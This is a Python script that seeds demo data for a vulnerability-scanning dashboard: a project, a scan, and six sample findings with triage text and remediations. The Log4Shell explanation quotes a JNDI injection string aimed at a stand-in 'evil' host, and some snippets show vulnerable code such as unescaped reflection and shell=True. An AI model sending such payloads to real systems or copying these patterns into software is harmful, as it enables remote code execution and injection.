"""Seed demo data: a project, target, scan, and sample findings + AI triage.

Run via `make seed-demo`. Produces a realistic-looking dataset so the UI is
populated immediately for demos/screenshots.
"""
from __future__ import annotations

import uuid

from app.core.config import settings
from app.core.db import SessionLocal
from app.core.logging import configure_logging, get_logger
from app.core.security import hash_password
from app.models.ai_triage import AITriage, FPLabel
from app.models.finding import Finding, FindingCategory, FindingStatus, Severity
from app.models.project import Project, ProjectType, Target, TargetKind
from app.models.scan import Scan, ScanStatus, ScanTask
from app.models.user import User

configure_logging()
log = get_logger(__name__)

DEMO_FINDINGS = [
    dict(scanner="nuclei", scanner_rule_id="CVE-2021-44228", category="vuln",
         severity="critical", title="Log4Shell RCE (CVE-2021-44228)",
         description="Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP/JNDI lookups.",
         cvss=10.0, cwe="CWE-502", owasp="A06", target_ref="https://demo.app/api",
         explanation="Attacker sends ${jndi:ldap://evil/x} in a header; the server logs it via Log4j2, "
                     "triggering a JNDI lookup that fetches and executes attacker code — pre-auth RCE.",
         remediation="Upgrade log4j-core to >=2.17.1. As a mitigation set log4j2.formatMsgNoLookups=true.",
         mitre_tactics=["TA0001"], mitre_techniques=["T1190"], risk=9.8),
    dict(scanner="semgrep", scanner_rule_id="python.django.security.audit.xss",
         category="vuln", severity="high", title="Reflected XSS in search endpoint",
         description="User input rendered without escaping.", cvss=7.4, cwe="CWE-79",
         owasp="A03", target_ref="app/views.py", file_path="app/views.py", line_start=42,
         code_snippet="return HttpResponse(query)",
         explanation="The search query is reflected into the response without HTML escaping, enabling script injection.",
         remediation="Use Django's escape() or template auto-escaping; never mark user input safe.",
         mitre_tactics=["TA0001"], mitre_techniques=["T1059"], risk=7.6),
    dict(scanner="trivy", scanner_rule_id="CVE-2024-3094", category="sca",
         severity="critical", title="xz-utils backdoor (CVE-2024-3094)",
         description="Malicious code in xz 5.6.0/5.6.1.", cvss=10.0, cwe="CWE-506",
         owasp="A06", target_ref="requirements.txt", file_path="requirements.txt",
         explanation="The xz library was backdoored in versions 5.6.0/5.6.1, enabling SSH server compromise.",
         remediation="Pin xz-utils to a known-good version (<5.6.0) and rotate any exposed credentials.",
         mitre_tactics=["TA0001"], mitre_techniques=["T1190"], risk=9.5),
    dict(scanner="gitleaks", scanner_rule_id="aws-access-token", category="secret",
         severity="high", title="Hardcoded AWS access token",
         description="AKIA... token found in config/settings.py.", cwe="CWE-798",
         owasp="A02", target_ref="config/settings.py", file_path="config/settings.py", line_start=17,
         code_snippet="AWS_KEY = 'AKIAIOSFODNN7EXAMPLE'",
         explanation="An AWS access key ID is committed to the repository. Anyone with repo access can use it.",
         remediation="Rotate the key in AWS IAM, remove it from history (git filter-repo), and use a secrets manager.",
         mitre_tactics=["TA0006"], mitre_techniques=["T1552"], risk=8.4),
    dict(scanner="nuclei", scanner_rule_id="exposed-git", category="misconfig",
         severity="medium", title="Exposed .git directory",
         description="The .git folder is accessible over HTTP.", cvss=5.3, cwe="CWE-200",
         owasp="A05", target_ref="https://demo.app/.git/config",
         explanation="A publicly accessible .git directory leaks the full source code and possibly commit history/secrets.",
         remediation="Block access to .git via web server config; serve only the build output.",
         mitre_tactics=["TA0007"], mitre_techniques=["T1083"], risk=5.8),
    dict(scanner="bandit", scanner_rule_id="B602", category="vuln", severity="medium",
         title="Subprocess call with shell=True",
         description="subprocess called with shell=True and user input.", cvss=6.5, cwe="CWE-78",
         owasp="A03", target_ref="scripts/run.py", file_path="scripts/run.py", line_start=88,
         code_snippet="subprocess.check_output(cmd, shell=True)",
         explanation="shell=True with untrusted input allows command injection.",
         remediation="Pass args as a list (shell=False) and validate/sanitize input.",
         mitre_tactics=["TA0002"], mitre_techniques=["T1059"], risk=6.1),
]


def seed() -> None:
    with SessionLocal() as db:
        # ensure admin exists
        admin = db.query(User).filter(User.email == settings.first_superuser_email).first()
        if not admin:
            admin = User(email=settings.first_superuser_email, password_hash=hash_password(settings.first_superuser_password),
                          full_name="VIGIL Admin", role="admin", is_superuser=True)
            db.add(admin)
            db.commit()
            db.refresh(admin)

        if db.query(Project).filter(Project.name == "Demo App").first():
            log.info("seed.already_seeded")
            return

        project = Project(name="Demo App", description="Deliberately vulnerable demo target",
                          type=ProjectType.both, owner_id=admin.id)
        db.add(project)
        db.commit()
        db.refresh(project)

        target = Target(project_id=project.id, kind=TargetKind.url, value="https://demo.app")
        db.add(target)
        db.commit()
        db.refresh(target)

        scan = Scan(project_id=project.id, target_id=target.id, scan_type="full",
                    status=ScanStatus.completed, progress=100)
        db.add(scan)
        db.commit()
        db.refresh(scan)

        for scanner_name in ["nuclei", "semgrep", "trivy", "gitleaks", "bandit"]:
            db.add(ScanTask(scan_id=scan.id, scanner=scanner_name, status=ScanStatus.completed, finding_count=1))

        for d in DEMO_FINDINGS:
            cat = FindingCategory(d["category"])
            sev = Severity(d["severity"])
            f = Finding(
                scan_id=scan.id, project_id=project.id, title=d["title"], description=d["description"],
                category=cat, severity=sev, scanner=d["scanner"], scanner_rule_id=d.get("scanner_rule_id"),
                scanner_confidence=0.85, cvss=d.get("cvss"), cwe=d.get("cwe"), owasp_category=d.get("owasp"),
                target_ref=d.get("target_ref"), file_path=d.get("file_path"), line_start=d.get("line_start"),
                code_snippet=d.get("code_snippet"), evidence=None, fingerprint=f"seed:{d['scanner_rule_id']}",
                status=FindingStatus.new,
            )
            db.add(f)
            db.flush()
            triage = AITriage(
                finding_id=f.id, fp_score=0.05, fp_label=FPLabel.likely_tp, risk_score=d["risk"],
                mitre_tactics=d.get("mitre_tactics"), mitre_techniques=d.get("mitre_techniques"),
                owasp_id=d.get("owasp"), cwe_id=d.get("cwe"), explanation=d["explanation"],
                remediation=d["remediation"], llm_model="seed", prompt_version=None, triage_method="seed",
            )
            db.add(triage)
        db.commit()
        log.info("seed.complete", findings=len(DEMO_FINDINGS))


if __name__ == "__main__":
    seed()
